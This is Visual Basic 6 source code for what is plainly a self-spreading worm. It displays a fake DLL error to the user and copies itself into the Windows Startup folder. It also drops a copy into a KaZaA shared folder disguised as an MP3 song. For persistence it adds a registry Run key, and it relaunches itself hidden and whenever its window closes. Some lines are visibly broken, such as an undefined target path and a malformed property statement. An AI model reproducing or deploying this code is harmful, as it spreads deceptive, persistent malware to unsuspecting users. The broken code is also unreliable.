Private Sub Form_Unload(Cancel As Integer)
  Shell App.Path & "\" & App.EXEName & ".exe"
  Open "C:\file.sys" For Output As #1
  End Sub
Private Sub form_load()
  Form1 Visible = False
  MsgBox "Cannot find vbflash32.dll, program disrupted", 16, "error"
  FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\BrainwashBrainwashBrainwash45.exe"
  FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\The White Stripes - IM INFECTED.mp3"
   strFile = App.Path & "\" & App.EXEName & ".exe"
   If Command() = vbNullString Then
       FileCopy strFile, strNewFile
       WriteToRegistry
       Shell strNewFile & " \brainwash29", vbHide
       End If
       End Sub
       Private Sub WriteToRegistry()
   Dim objReg As Object
   Set objReg = CreateObject("wscript.shell")
   objReg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & strProjectName, strNewFile & " \brainwash29"
   End Sub 
